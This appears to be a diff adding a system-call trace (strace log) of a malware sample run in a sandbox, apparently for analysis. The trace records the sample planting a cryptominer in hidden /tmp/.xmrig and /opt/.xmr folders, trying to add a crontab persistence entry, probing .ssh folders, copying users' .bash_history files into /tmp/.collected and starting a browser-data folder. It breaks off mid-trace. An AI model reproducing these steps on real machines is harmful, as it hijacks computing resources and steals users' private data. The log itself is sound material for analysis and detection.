@@ -1,0 +1,585 @@
+117   execve("samples/Sample1", ["samples/Sample1"], 0x7ffcbff98f78 /* 9 vars */) = 0
+117   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+117   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+117   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+118   execve("/bin/sh", ["sh", "-c", "--", "mkdir -p /tmp/.xmrig 2>/dev/null"], 0x7fff79ac5128 /* 9 vars */) = 0
+118   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+118   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+118   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+118   newfstatat(AT_FDCWD, "/home/app", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+118   newfstatat(AT_FDCWD, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+118   openat(AT_FDCWD, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+118   newfstatat(AT_FDCWD, "/usr/local/sbin/mkdir", 0x7fff5dc71a60, 0) = -1 ENOENT (No such file or directory)
+118   newfstatat(AT_FDCWD, "/usr/local/bin/mkdir", 0x7fff5dc71a60, 0) = -1 ENOENT (No such file or directory)
+118   newfstatat(AT_FDCWD, "/usr/sbin/mkdir", 0x7fff5dc71a60, 0) = -1 ENOENT (No such file or directory)
+118   newfstatat(AT_FDCWD, "/usr/bin/mkdir", {st_mode=S_IFREG|0755, st_size=76296, ...}, 0) = 0
+119   execve("/usr/bin/mkdir", ["mkdir", "-p", "/tmp/.xmrig"], 0x5992086ab668 /* 9 vars */) = 0
+119   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+119   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+119   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libselinux.so.1", O_RDONLY|O_CLOEXEC) = 3
+119   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+119   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libpcre2-8.so.0", O_RDONLY|O_CLOEXEC) = 3
+119   statfs("/sys/fs/selinux", 0x7ffcf7ac64a0) = -1 ENOENT (No such file or directory)
+119   statfs("/selinux", 0x7ffcf7ac64a0) = -1 ENOENT (No such file or directory)
+119   openat(AT_FDCWD, "/proc/filesystems", O_RDONLY|O_CLOEXEC) = 3
+119   access("/etc/selinux/config", F_OK) = -1 ENOENT (No such file or directory)
+119   mkdir("/tmp", 0777)               = -1 EEXIST (File exists)
+119   chdir("/tmp")                     = 0
+119   mkdir(".xmrig", 0777)             = -1 EEXIST (File exists)
+119   newfstatat(AT_FDCWD, ".xmrig", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+119   +++ exited with 0 +++
+118   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=119, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+118   +++ exited with 0 +++
+117   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=118, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+120   execve("/bin/sh", ["sh", "-c", "--", "mkdir -p /opt/.xmr 2>/dev/null"], 0x7fff79ac5128 /* 9 vars */) = 0
+120   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+120   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+120   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+120   newfstatat(AT_FDCWD, "/home/app", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+120   newfstatat(AT_FDCWD, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+120   openat(AT_FDCWD, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+120   newfstatat(AT_FDCWD, "/usr/local/sbin/mkdir", 0x7ffec5c5d970, 0) = -1 ENOENT (No such file or directory)
+120   newfstatat(AT_FDCWD, "/usr/local/bin/mkdir", 0x7ffec5c5d970, 0) = -1 ENOENT (No such file or directory)
+120   newfstatat(AT_FDCWD, "/usr/sbin/mkdir", 0x7ffec5c5d970, 0) = -1 ENOENT (No such file or directory)
+120   newfstatat(AT_FDCWD, "/usr/bin/mkdir", {st_mode=S_IFREG|0755, st_size=76296, ...}, 0) = 0
+121   execve("/usr/bin/mkdir", ["mkdir", "-p", "/opt/.xmr"], 0x5cc97e481668 /* 9 vars */) = 0
+121   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+121   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+121   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libselinux.so.1", O_RDONLY|O_CLOEXEC) = 3
+121   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+121   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libpcre2-8.so.0", O_RDONLY|O_CLOEXEC) = 3
+121   statfs("/sys/fs/selinux", 0x7ffebcdec480) = -1 ENOENT (No such file or directory)
+121   statfs("/selinux", 0x7ffebcdec480) = -1 ENOENT (No such file or directory)
+121   openat(AT_FDCWD, "/proc/filesystems", O_RDONLY|O_CLOEXEC) = 3
+121   access("/etc/selinux/config", F_OK) = -1 ENOENT (No such file or directory)
+121   mkdir("/opt", 0777)               = -1 EEXIST (File exists)
+121   chdir("/opt")                     = 0
+121   mkdir(".xmr", 0777)               = -1 EEXIST (File exists)
+121   newfstatat(AT_FDCWD, ".xmr", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+121   +++ exited with 0 +++
+120   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=121, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+120   +++ exited with 0 +++
+117   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=120, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+117   openat(AT_FDCWD, "/tmp/.xmrig/miner", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+117   chmod("/tmp/.xmrig/miner", 0755)  = 0
+122   execve("/tmp/.xmrig/miner", ["miner", "30"], 0x7fff79ac5128 /* 9 vars */) = 0
+122   readlink("/proc/self/exe", "/tmp/.xmrig/miner", 4096) = 17
+122   openat(AT_FDCWD, "/opt/.xmr/miner.log", O_WRONLY|O_CREAT|O_APPEND, 0666) = 3
+122   +++ exited with 0 +++
+117   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=122, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+123   newfstatat(1, "",  <unfinished ...>
+117   openat(AT_FDCWD, "/tmp/.xmrig/config.json", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+123   <... newfstatat resumed>{st_mode=S_IFREG|0644, st_size=1993, ...}, AT_EMPTY_PATH) = 0
+123   newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=494, ...}, 0) = 0
+123   newfstatat(AT_FDCWD, "/", {st_mode=S_IFDIR|0555, st_size=4096, ...}, 0) = 0
+123   openat(AT_FDCWD, "/etc/nsswitch.conf", O_RDONLY|O_CLOEXEC <unfinished ...>
+124   execve("/bin/sh", ["sh", "-c", "--", "(crontab -l 2>/dev/null; echo \"@"...], 0x7fff79ac5128 /* 9 vars */ <unfinished ...>
+123   <... openat resumed>)             = 4
+123   newfstatat(4, "", {st_mode=S_IFREG|0644, st_size=494, ...}, AT_EMPTY_PATH) = 0
+124   <... execve resumed>)             = 0
+123   newfstatat(4, "", {st_mode=S_IFREG|0644, st_size=494, ...}, AT_EMPTY_PATH) = 0
+123   openat(AT_FDCWD, "/etc/passwd", O_RDONLY|O_CLOEXEC <unfinished ...>
+124   access("/etc/ld.so.preload", R_OK <unfinished ...>
+123   <... openat resumed>)             = 4
+124   <... access resumed>)             = -1 ENOENT (No such file or directory)
+124   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC <unfinished ...>
+123   newfstatat(4, "",  <unfinished ...>
+124   <... openat resumed>)             = 3
+123   <... newfstatat resumed>{st_mode=S_IFREG|0644, st_size=933, ...}, AT_EMPTY_PATH) = 0
+124   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+124   newfstatat(AT_FDCWD, "/home/app", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+124   newfstatat(AT_FDCWD, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+124   newfstatat(AT_FDCWD, "/usr/local/sbin/crontab", 0x7ffffa5a7450, 0) = -1 ENOENT (No such file or directory)
+124   newfstatat(AT_FDCWD, "/usr/local/bin/crontab", 0x7ffffa5a7450, 0) = -1 ENOENT (No such file or directory)
+124   newfstatat(AT_FDCWD, "/usr/sbin/crontab", 0x7ffffa5a7450, 0) = -1 ENOENT (No such file or directory)
+124   newfstatat(AT_FDCWD, "/usr/bin/crontab", 0x7ffffa5a7450, 0) = -1 ENOENT (No such file or directory)
+124   newfstatat(AT_FDCWD, "/sbin/crontab", 0x7ffffa5a7450, 0) = -1 ENOENT (No such file or directory)
+124   newfstatat(AT_FDCWD, "/bin/crontab", 0x7ffffa5a7450, 0) = -1 ENOENT (No such file or directory)
+126   openat(AT_FDCWD, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+126   newfstatat(AT_FDCWD, "/usr/local/sbin/crontab", 0x7ffffa5a72e0, 0) = -1 ENOENT (No such file or directory)
+126   newfstatat(AT_FDCWD, "/usr/local/bin/crontab", 0x7ffffa5a72e0, 0) = -1 ENOENT (No such file or directory)
+126   newfstatat(AT_FDCWD, "/usr/sbin/crontab", 0x7ffffa5a72e0, 0) = -1 ENOENT (No such file or directory)
+126   newfstatat(AT_FDCWD, "/usr/bin/crontab", 0x7ffffa5a72e0, 0) = -1 ENOENT (No such file or directory)
+126   newfstatat(AT_FDCWD, "/sbin/crontab",  <unfinished ...>
+125   openat(AT_FDCWD, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC, 0666 <unfinished ...>
+126   <... newfstatat resumed>0x7ffffa5a72e0, 0) = -1 ENOENT (No such file or directory)
+126   newfstatat(AT_FDCWD, "/bin/crontab",  <unfinished ...>
+125   <... openat resumed>)             = 3
+126   <... newfstatat resumed>0x7ffffa5a72e0, 0) = -1 ENOENT (No such file or directory)
+125   newfstatat(AT_FDCWD, "/usr/local/sbin/crontab", 0x7ffffa5a71d0, 0) = -1 ENOENT (No such file or directory)
+125   newfstatat(AT_FDCWD, "/usr/local/bin/crontab", 0x7ffffa5a71d0, 0) = -1 ENOENT (No such file or directory)
+126   +++ exited with 127 +++
+125   newfstatat(AT_FDCWD, "/usr/sbin/crontab", 0x7ffffa5a71d0, 0) = -1 ENOENT (No such file or directory)
+124   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=126, si_uid=0, si_status=127, si_utime=0, si_stime=0} ---
+125   newfstatat(AT_FDCWD, "/usr/bin/crontab", 0x7ffffa5a71d0, 0) = -1 ENOENT (No such file or directory)
+125   newfstatat(AT_FDCWD, "/sbin/crontab", 0x7ffffa5a71d0, 0) = -1 ENOENT (No such file or directory)
+125   newfstatat(AT_FDCWD, "/bin/crontab", 0x7ffffa5a71d0, 0) = -1 ENOENT (No such file or directory)
+125   --- SIGPIPE {si_signo=SIGPIPE, si_code=SI_USER, si_pid=125, si_uid=0} ---
+125   +++ killed by SIGPIPE +++
+124   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_KILLED, si_pid=125, si_uid=0, si_status=SIGPIPE, si_utime=0, si_stime=0} ---
+124   +++ exited with 127 +++
+117   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=124, si_uid=0, si_status=127, si_utime=0, si_stime=0} ---
+127   execve("/bin/sh", ["sh", "-c", "--", "mkdir -p /tmp/.collected 2>/dev/"...], 0x7fff79ac5128 /* 9 vars */) = 0
+127   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+127   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+127   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+127   newfstatat(AT_FDCWD, "/home/app", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+127   newfstatat(AT_FDCWD, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+127   openat(AT_FDCWD, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+127   newfstatat(AT_FDCWD, "/usr/local/sbin/mkdir", 0x7fff50837960, 0) = -1 ENOENT (No such file or directory)
+127   newfstatat(AT_FDCWD, "/usr/local/bin/mkdir", 0x7fff50837960, 0) = -1 ENOENT (No such file or directory)
+127   newfstatat(AT_FDCWD, "/usr/sbin/mkdir", 0x7fff50837960, 0) = -1 ENOENT (No such file or directory)
+127   newfstatat(AT_FDCWD, "/usr/bin/mkdir", {st_mode=S_IFREG|0755, st_size=76296, ...}, 0) = 0
+128   execve("/usr/bin/mkdir", ["mkdir", "-p", "/tmp/.collected"], 0x5cebd6bed668 /* 9 vars */) = 0
+128   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+128   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+128   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libselinux.so.1", O_RDONLY|O_CLOEXEC) = 3
+128   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+128   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libpcre2-8.so.0", O_RDONLY|O_CLOEXEC) = 3
+128   statfs("/sys/fs/selinux", 0x7fff7b4781a0) = -1 ENOENT (No such file or directory)
+128   statfs("/selinux", 0x7fff7b4781a0) = -1 ENOENT (No such file or directory)
+128   openat(AT_FDCWD, "/proc/filesystems", O_RDONLY|O_CLOEXEC) = 3
+128   access("/etc/selinux/config", F_OK) = -1 ENOENT (No such file or directory)
+128   mkdir("/tmp", 0777)               = -1 EEXIST (File exists)
+128   chdir("/tmp")                     = 0
+128   mkdir(".collected", 0777)         = -1 EEXIST (File exists)
+128   newfstatat(AT_FDCWD, ".collected", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+128   +++ exited with 0 +++
+127   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=128, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+127   +++ exited with 0 +++
+117   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=127, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+117   newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=494, ...}, 0) = 0
+117   newfstatat(AT_FDCWD, "/", {st_mode=S_IFDIR|0555, st_size=4096, ...}, 0) = 0
+117   openat(AT_FDCWD, "/etc/nsswitch.conf", O_RDONLY|O_CLOEXEC) = 3
+117   openat(AT_FDCWD, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 3
+117   newfstatat(AT_FDCWD, "/root/.ssh", 0x7fff79ac20a0, 0) = -1 ENOENT (No such file or directory)
+129   execve("/bin/sh", ["sh", "-c", "--", "cp /root/.bash_history /tmp/.col"...], 0x7fff79ac5128 /* 9 vars */) = 0
+129   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+129   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+129   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+129   newfstatat(AT_FDCWD, "/home/app", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+129   newfstatat(AT_FDCWD, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+129   openat(AT_FDCWD, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+129   newfstatat(AT_FDCWD, "/usr/local/sbin/cp", 0x7ffdab48d6d0, 0) = -1 ENOENT (No such file or directory)
+129   newfstatat(AT_FDCWD, "/usr/local/bin/cp", 0x7ffdab48d6d0, 0) = -1 ENOENT (No such file or directory)
+129   newfstatat(AT_FDCWD, "/usr/sbin/cp", 0x7ffdab48d6d0, 0) = -1 ENOENT (No such file or directory)
+129   newfstatat(AT_FDCWD, "/usr/bin/cp", {st_mode=S_IFREG|0755, st_size=141848, ...}, 0) = 0
+130   execve("/usr/bin/cp", ["cp", "/root/.bash_history", "/tmp/.collected/history_root"], 0x5c106c8e2568 /* 9 vars */) = 0
+130   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+130   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+130   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libselinux.so.1", O_RDONLY|O_CLOEXEC) = 3
+130   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libacl.so.1", O_RDONLY|O_CLOEXEC) = 3
+130   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libattr.so.1", O_RDONLY|O_CLOEXEC) = 3
+130   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+130   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libpcre2-8.so.0", O_RDONLY|O_CLOEXEC) = 3
+130   statfs("/sys/fs/selinux", 0x7ffd153a3250) = -1 ENOENT (No such file or directory)
+130   statfs("/selinux", 0x7ffd153a3250) = -1 ENOENT (No such file or directory)
+130   openat(AT_FDCWD, "/proc/filesystems", O_RDONLY|O_CLOEXEC) = 3
+130   access("/etc/selinux/config", F_OK) = -1 ENOENT (No such file or directory)
+130   openat(AT_FDCWD, "/tmp/.collected/history_root", O_RDONLY|O_PATH|O_DIRECTORY) = -1 ENOENT (No such file or directory)
+130   newfstatat(AT_FDCWD, "/root/.bash_history", 0x7ffd153a2e50, 0) = -1 ENOENT (No such file or directory)
+130   +++ exited with 1 +++
+129   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=130, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+129   +++ exited with 1 +++
+117   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=129, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+117   newfstatat(AT_FDCWD, "/nonexistent/.ssh", 0x7fff79ac20a0, 0) = -1 ENOENT (No such file or directory)
+131   execve("/bin/sh", ["sh", "-c", "--", "cp /nonexistent/.bash_history /t"...], 0x7fff79ac5128 /* 9 vars */) = 0
+131   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+131   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+131   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+131   newfstatat(AT_FDCWD, "/home/app", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+131   newfstatat(AT_FDCWD, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+131   openat(AT_FDCWD, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+131   newfstatat(AT_FDCWD, "/usr/local/sbin/cp", 0x7ffd25b156c0, 0) = -1 ENOENT (No such file or directory)
+131   newfstatat(AT_FDCWD, "/usr/local/bin/cp", 0x7ffd25b156c0, 0) = -1 ENOENT (No such file or directory)
+131   newfstatat(AT_FDCWD, "/usr/sbin/cp", 0x7ffd25b156c0, 0) = -1 ENOENT (No such file or directory)
+131   newfstatat(AT_FDCWD, "/usr/bin/cp", {st_mode=S_IFREG|0755, st_size=141848, ...}, 0) = 0
+132   execve("/usr/bin/cp", ["cp", "/nonexistent/.bash_history", "/tmp/.collected/history_nobody"], 0x607f3fafd590 /* 9 vars */) = 0
+132   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+132   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+132   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libselinux.so.1", O_RDONLY|O_CLOEXEC) = 3
+132   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libacl.so.1", O_RDONLY|O_CLOEXEC) = 3
+132   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libattr.so.1", O_RDONLY|O_CLOEXEC) = 3
+132   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+132   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libpcre2-8.so.0", O_RDONLY|O_CLOEXEC) = 3
+132   statfs("/sys/fs/selinux", 0x7ffcf30d7330) = -1 ENOENT (No such file or directory)
+132   statfs("/selinux", 0x7ffcf30d7330) = -1 ENOENT (No such file or directory)
+132   openat(AT_FDCWD, "/proc/filesystems", O_RDONLY|O_CLOEXEC) = 3
+132   access("/etc/selinux/config", F_OK) = -1 ENOENT (No such file or directory)
+132   openat(AT_FDCWD, "/tmp/.collected/history_nobody", O_RDONLY|O_PATH|O_DIRECTORY) = -1 ENOENT (No such file or directory)
+132   newfstatat(AT_FDCWD, "/nonexistent/.bash_history", 0x7ffcf30d6f30, 0) = -1 ENOENT (No such file or directory)
+132   +++ exited with 1 +++
+131   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=132, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+131   +++ exited with 1 +++
+117   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=131, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+117   newfstatat(AT_FDCWD, "/home/ubuntu/.ssh", 0x7fff79ac20a0, 0) = -1 ENOENT (No such file or directory)
+133   execve("/bin/sh", ["sh", "-c", "--", "cp /home/ubuntu/.bash_history /t"...], 0x7fff79ac5128 /* 9 vars */) = 0
+133   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+133   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+133   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+133   newfstatat(AT_FDCWD, "/home/app", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+133   newfstatat(AT_FDCWD, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+133   openat(AT_FDCWD, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+133   newfstatat(AT_FDCWD, "/usr/local/sbin/cp", 0x7ffecde91990, 0) = -1 ENOENT (No such file or directory)
+133   newfstatat(AT_FDCWD, "/usr/local/bin/cp", 0x7ffecde91990, 0) = -1 ENOENT (No such file or directory)
+133   newfstatat(AT_FDCWD, "/usr/sbin/cp", 0x7ffecde91990, 0) = -1 ENOENT (No such file or directory)
+133   newfstatat(AT_FDCWD, "/usr/bin/cp", {st_mode=S_IFREG|0755, st_size=141848, ...}, 0) = 0
+134   execve("/usr/bin/cp", ["cp", "/home/ubuntu/.bash_history", "/tmp/.collected/history_ubuntu"], 0x5eac5f83c590 /* 9 vars */) = 0
+134   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+134   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+134   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libselinux.so.1", O_RDONLY|O_CLOEXEC) = 3
+134   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libacl.so.1", O_RDONLY|O_CLOEXEC) = 3
+134   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libattr.so.1", O_RDONLY|O_CLOEXEC) = 3
+134   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+134   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libpcre2-8.so.0", O_RDONLY|O_CLOEXEC) = 3
+134   statfs("/sys/fs/selinux", 0x7ffdd2fb2170) = -1 ENOENT (No such file or directory)
+134   statfs("/selinux", 0x7ffdd2fb2170) = -1 ENOENT (No such file or directory)
+134   openat(AT_FDCWD, "/proc/filesystems", O_RDONLY|O_CLOEXEC) = 3
+134   access("/etc/selinux/config", F_OK) = -1 ENOENT (No such file or directory)
+134   openat(AT_FDCWD, "/tmp/.collected/history_ubuntu", O_RDONLY|O_PATH|O_DIRECTORY) = -1 ENOENT (No such file or directory)
+134   newfstatat(AT_FDCWD, "/home/ubuntu/.bash_history", 0x7ffdd2fb1d70, 0) = -1 ENOENT (No such file or directory)
+134   +++ exited with 1 +++
+133   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=134, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+133   +++ exited with 1 +++
+117   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=133, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+117   newfstatat(AT_FDCWD, "/home/uubuntu/.ssh", 0x7fff79ac20a0, 0) = -1 ENOENT (No such file or directory)
+135   execve("/bin/sh", ["sh", "-c", "--", "cp /home/uubuntu/.bash_history /"...], 0x7fff79ac5128 /* 9 vars */) = 0
+135   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+135   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+135   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+135   newfstatat(AT_FDCWD, "/home/app", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+135   newfstatat(AT_FDCWD, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
+135   openat(AT_FDCWD, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
+135   newfstatat(AT_FDCWD, "/usr/local/sbin/cp", 0x7ffe52ee8740, 0) = -1 ENOENT (No such file or directory)
+135   newfstatat(AT_FDCWD, "/usr/local/bin/cp", 0x7ffe52ee8740, 0) = -1 ENOENT (No such file or directory)
+135   newfstatat(AT_FDCWD, "/usr/sbin/cp", 0x7ffe52ee8740, 0) = -1 ENOENT (No such file or directory)
+135   newfstatat(AT_FDCWD, "/usr/bin/cp", {st_mode=S_IFREG|0755, st_size=141848, ...}, 0) = 0
+136   execve("/usr/bin/cp", ["cp", "/home/uubuntu/.bash_history", "/tmp/.collected/history_uubuntu"], 0x5ffdcb8e3590 /* 9 vars */) = 0
+136   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+136   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+136   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libselinux.so.1", O_RDONLY|O_CLOEXEC) = 3
+136   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libacl.so.1", O_RDONLY|O_CLOEXEC) = 3
+136   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libattr.so.1", O_RDONLY|O_CLOEXEC) = 3
+136   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
+136   openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libpcre2-8.so.0", O_RDONLY|O_CLOEXEC) = 3
+136   statfs("/sys/fs/selinux", 0x7ffec668e860) = -1 ENOENT (No such file or directory)
+136   statfs("/selinux", 0x7ffec668e860) = -1 ENOENT (No such file or directory)
+136   openat(AT_FDCWD, "/proc/filesystems", O_RDONLY|O_CLOEXEC) = 3
+136   access("/etc/selinux/config", F_OK) = -1 ENOENT (No such file or directory)
+136   openat(AT_FDCWD, "/tmp/.collected/history_uubuntu", O_RDONLY|O_PATH|O_DIRECTORY) = -1 ENOENT (No such file or directory)
+136   newfstatat(AT_FDCWD, "/home/uubuntu/.bash_history", 0x7ffec668e460, 0) = -1 ENOENT (No such file or directory)
+136   +++ exited with 1 +++
+135   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=136, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+135   +++ exited with 1 +++
+117   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=135, si_uid=0, si_status=1, si_utime=0, si_stime=0} ---
+117   newfstatat(AT_FDCWD, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=494, ...}, 0) = 0
+137   execve("/bin/sh", ["sh", "-c", "--", "mkdir -p /tmp/.collected/browser"...], 0x7fff79ac5128 /* 9 vars */) = 0
+137   access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+137   openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
